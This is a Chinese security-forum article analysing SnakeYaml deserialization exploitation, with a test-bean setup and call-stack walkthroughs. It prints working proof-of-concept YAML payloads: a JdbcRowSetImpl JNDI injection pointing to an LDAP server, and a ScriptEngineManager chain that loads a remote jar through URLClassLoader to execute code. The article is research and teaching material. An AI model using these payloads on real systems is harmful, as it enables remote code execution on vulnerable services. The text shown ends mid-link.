---
title: 从 SnakeYaml 看 ClassPathXmlApplicationContext 不出网利用
url: https://forum.butian.net/share/4467
source: 奇安信攻防社区
date: 2025-08-08
fetch_date: 2025-10-07T00:15:54.118935
---

# 从 SnakeYaml 看 ClassPathXmlApplicationContext 不出网利用

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 从 SnakeYaml 看 ClassPathXmlApplicationContext 不出网利用

* [漏洞分析](https://forum.butian.net/topic/48)

当我自信的将`ClassPathXmlApplicationContext不出网`融入到`SnakeYaml`中进行利用第一时间居然没有成功复现, 当我排查问题时却又想到我真的懂`beans.xml`吗, 这一系列蝴蝶效应而衍生出的各种细节问题, 太多了, 因此在本篇文章中会讲一个特别长的故事进行刨析它们之间的原理并记载我所遇到的问题.

前言
--
今年4月, P 神博客更新了一篇`ClassPathXmlApplicationContext的不出网利用`文章: <https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html>
我对其进行了学习, 但当我自信的将`ClassPathXmlApplicationContext不出网`融入到`SnakeYaml`中进行利用第一时间居然没有成功复现, 当我排查问题时却又想到我真的懂`beans.xml`吗, 这一系列蝴蝶效应而衍生出的各种细节问题, 太多了, 因此在本篇文章中会讲一个特别长的故事进行刨析它们之间的原理并记载我所遇到的问题.
> 例如: 常用于`getter & setter`的 Jndi JdbcRowSetImpl 链, 以及 SPI 机制的底层注册原理, 还有不出网的`c3p0`, 以及`c3p0`反序列化本身. 并且国外大佬挖掘出了在 openjdk &gt;= 11 版本的 `MarshalOutputStream`写文件原生链, 以及写文件姿势与SPI链进行配合, 以及 ClassPathXmlApplicationContext 的出网与不出网的利用又引入了 SpEL 表达式 RCE 同时又引出了 SpEL 如何注入内存马, 在一些链路中使用到了`Hessian`的链路又引入了`平替BadAttributeValueExpException的方法`, 一个 SnakeYaml 引入了我们各方面的思考...
漏洞分析
----
### 环境搭建
pom.xml:
```xml
<dependencies>
<dependency>
<groupId>org.yaml</groupId>
<artifactId>snakeyaml</artifactId>
<version>1.33</version>
<!-- 2.4 版本被修复 -->
</dependency>
<dependency>
<groupId>junit</groupId>
<artifactId>junit</artifactId>
<version>4.13.2</version>
<scope>provided</scope>
</dependency>
</dependencies>
```
定义一个`Bean`:
```java
package com.heihu577.bean;
public class Person {
private String username;
private int age;
public Person() {
try {
throw new RuntimeException("Person NoArgs constructor...");
} catch (Exception e) {
e.printStackTrace();
}
}
public Person(String username, int age) {
try {
throw new RuntimeException("Person AllArgs constructor...");
} catch (Exception e) {
e.printStackTrace();
}
this.username = username;
this.age = age;
}
public String getUsername() {
try {
throw new RuntimeException("Person getUsername...");
} catch (Exception e) {
e.printStackTrace();
}
return username;
}
public void setUsername(String username) {
try {
throw new RuntimeException("Person setUsername...");
} catch (Exception e) {
e.printStackTrace();
}
this.username = username;
}
public int getAge() {
try {
throw new RuntimeException("Person getAge...");
} catch (Exception e) {
e.printStackTrace();
}
return age;
}
public void setAge(int age) {
try {
throw new RuntimeException("Person setAge...");
} catch (Exception e) {
e.printStackTrace();
}
this.age = age;
}
@Override
public String toString() {
return "Person{" +
"username='" + username + '\'' +
", age=" + age +
'}';
}
}
```
其中为了调试方便, 将所有的`setter && getter`方法主动抛出异常, 在`catch`中进行打印调用栈了, 方便对漏洞原理进行一个简单的理解.
定义如下测试用例:
```java
package com.heihu577;
import com.heihu577.bean.Person;
import org.junit.Test;
import org.yaml.snakeyaml.Yaml;
public class SnakeYamlTest {
@Test
public void yamlDump() {
Yaml yaml = new Yaml();
Person heihu577 = new Person("heihu577", 18);
String dump = yaml.dump(heihu577);
System.out.println(dump);
}
@Test
public void yamlLoad() {
Yaml yaml = new Yaml();
String yamlText = "!!com.heihu577.bean.Person {age: 18, username: heihu577}";
Person person = (Person) yaml.load(yamlText);
System.out.println(person);
}
}
```
### 调用栈分析及利用方法
#### 漏洞触发点说明
实际上`org.yaml.snakeyaml.Yaml::dump(Object)`会触发`对应Bean`的`getter`方法, 而由于我们的恶意`Bean`不会无缘无故放入在内存中并且将其主动`Dump`出来, 所以这个点比较冷门, 运行一下案例中的`yamlDump`方法可以得到调用栈, 并且进行`Debug`看到一个简单的原理:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-40b2cea89ed333136f875a58c62242f18f6cdcf6.png)
这里的本质还是通过反射进行调用, 并且可以看到的是这边使用了`setAccessible`, 无论具体`getter`方法的访问权限有多大都可以进行调用.
不过我们应该更关注`org.yaml.snakeyaml.Yaml::load(String)`方法, 因为它接收一个字符串 (假设该字符串可控), 并且由于该`String`中可以像`FastJson`中进行指明`@type`方式去实例化自定义的类, 并且允许调用其`setter`方法以及`任意构造器`, 所以这个点是比较危险的, 可以调试案例中的`yamlLoad`方法看到其调用`setter`方法的调用栈:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-f69e5538c3336ec93181adebfa2b1ca2f21711a9.png)
##### 官方文档说明
而针对于为什么`!!类名`可以进行实例化一些类, 在不阅读底层代码的情况下我们能够从官方文档中去了解: <https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation>
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-8953f21b05ec84efd4b90e8ea6f65f4e6bea7572.png)
##### 与 FastJson 不同点
而针对利用姿势来讲, 这里将 P 牛的表格粘贴过来:
| | Fastjson | SnakeYAML |
|---|---|---|
| setter | ✅ | ✅ |
| getter | ✅ | ❌ |
| constructor | ⭕（有条件） | ✅ |
`FastJson`可以调用其`getter && setter`方法. 但`SnakeYaml`只允许调用`无参构造器 + setter`方法 &amp; `有参构造器参数可控`这两种情况, 而有参构造器的调用可以如下所示:
```java
@Test
public void yamlLoad() {
Yaml yaml = new Yaml();
String yamlText = "!!com.heihu577.bean.Person [!!java.lang.String Heihu577,!!int 12]";
Person person = (Person) yaml.load(yamlText);
System.out.println(person);
}
```
我们的`Yaml`串主要以如下形式编写过来:
```php
!!类名 [!!参数1类型 参数1值, !!参数2类型 参数2值]
```
最终结果:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-83daee82339aced16b4b8e3614144bf3047a0aae.png)
#### 原生 Jndi - JdbcRowSetImpl【利用两次 setter】需出网
`JdbcRowSetImpl`这条链在`FastJson低版本利用`中是一条`Jndi出网链`, 由于它存在无参的构造方法, 并且它的`setAutoCommit`方法 (setter) 是存在 JNDI 注入的, 调用栈如下:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-1338ca4bea37999cd652a936fe9bb8221b556f28.png)
而这边所`lookup`的`getDataSourceName`方法实际上也提供了`setter`方法:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-2dc7226741a177a4f64fd0fee02fff7189728441.png)
所以第一次调用`setDataSourceName`, 第二次调用`setAutoCommit`即可进行JNDI注入:
```java
@Test
public void yamlLoad() {
Yaml yaml = new Yaml();
String yamlText = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: \"ldap://127.0.0.1:1389/Basic/Command/Y2FsYw==\", autoCommit: true}"; // ldap 中返回的 reference 是命令执行的代码.
Person person = (Person) yaml.load(yamlText);
System.out.println(person);
}
```
本机启动一个`LDAP`服务器: java -jar JNDIMap-0.0.1.jar, 运行即可弹窗:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-7e0fd7cbb6a1b5b1b7d305d494f4442c6c89d8df.png)
#### 原生 URLClassLoader &amp; SPI - ScriptEngineManager【利用带参构造器】需出网
对于 SPI 机制可以参考: <https://mp.weixin.qq.com/s/8q4XMhoWL9bqNNp83j6-HA>
ScriptEngineManager 的介绍在: <https://mp.weixin.qq.com/s/JYbOJ25Qsv1JPrqV8dfdnA>
然后我们看一下漏洞所产生的原因, 问题出在`ScriptEngineManager`的构造器允许接收自定义`ClassLoader`并使用该`ClassLoader`进行加载实现`javax.script.ScriptEngineFactory`接口的服务:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-32df3a2be90b82277a46cefce402531abb0cfd74.png)
然后我们看一下漏洞所产生的原因, 问题出在`ScriptEngineManager`的构造器允许接收自定义`ClassLoader`并使用该`ClassLoader`进行加载实现`javax.script.ScriptEngineFactory`接口的服务:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-dac1ce952004de313cea63b20a8c130e11e45ce3.png)
- `ScriptEngineManager的构造器`是可控的 (传入基于远程的 URLClassLoader).
- `ScriptEngineManager的构造器`中存在危险操作 (也就是通过 SPI 机制实例化对象).
刚好满足`SnakeYaml`构造器利用的条件, 那么本地创建一个 IDEA 项目:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-68b65321fd4002f7625e0b676d9307a7eb3349e7.png)
随后使用`python`在该`jar包目录下`进行监听`8000`端口后, 编写如下`POC`进行触发弹窗:
```java
@Test
public void yamlLoad() {
Yaml yaml = new Yaml();
String yamlText = "!!javax.script.ScriptEngineManager [" +
"!!java.net.URLClassLoader [" + // 由于 URLClassLoader 第一个参数是数组, 所以需要多加一层 []
"[!!java.net.URL [!!java.lang.String \"http://127.0.0.1:8000/SPITester01.jar\"]]" + // URL 接收的也是数组, 多加一层 []
"]" +
"]";
Person person = (Person) yaml.load(yamlText);
System.out.println(person);
}
```
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-e04c7c52ce5fd7642b3fc0c31...